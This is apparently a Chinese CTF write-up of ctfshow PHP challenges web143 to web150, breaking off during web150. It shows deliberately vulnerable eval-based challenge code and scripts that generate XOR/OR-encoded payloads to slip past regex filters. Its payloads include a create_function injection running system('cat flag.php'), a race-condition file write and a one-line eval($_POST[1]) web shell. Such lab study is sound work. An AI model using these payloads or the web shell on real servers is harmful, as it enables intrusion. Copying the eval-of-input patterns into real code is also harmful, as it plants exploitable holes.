<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure>
<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没什么变化，主要就是v2,v3换了个位置，对v3加了个check过滤，要求长度为1</p>
<p>payload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=1&amp;v2=*(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);</span><br></pre></td></tr></table></figure>


<h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以用或运算</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//对双引号做了过滤，用单引号替换</span><br><span class="line">//对加减乘除做了过滤，可以1用或替换 0|(xxx)|0  ，当然也可以用三元运算符 1?(xxxx):0</span><br><span class="line"></span><br><span class="line">?v1=0&amp;v2=0&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%03%01%14%00%06%0c%01%07%02%10%08%10&#x27;|&#x27;%60%60%60%20%60%60%60%60%2c%60%60%60&#x27;)|</span><br></pre></td></tr></table></figure>


<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有对<code>|</code>做过滤，payload同web145</p>
<h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210307104106.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>很容易就fuzz到了就是<code>\</code>这个符号</p>
<p>后来稍微翻了翻别人的writeup，才知道原因，<strong>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p>
<p>紧接着就到了如何只控制第二个参数来执行命令的问题了，后来找到可以用<code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。</p>
<p>函数结构形似</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">create_function(&#x27;$a,$b<span class="string">&#x27;,&#x27;</span><span class="keyword">return</span> <span class="number">111</span>&#x27;)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title">a</span>($a, $b)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样一来，我们想要执行的代码就会执行</p>
<p>paylaod:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">get: <span class="attribute">show</span>=echo 123;&#125;system(<span class="string">&#x27;cat flag.php&#x27;</span>);//</span><br><span class="line">post: <span class="attribute">ctf</span>=%5ccreate_function</span><br></pre></td></tr></table></figure>


<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210307110230.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>脚本同web143</p>
<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遍历当前目录下所以文件，只保留<code>index.php</code>，其他文件都删除</p>
<p>可以利用条件竞争</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=<span class="number">1.</span>php</span><br><span class="line">show=<span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat /ctfshow_fl0g_here.txt&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p>
<p>非预期，直接往index.php里面写一句话<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=index.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span 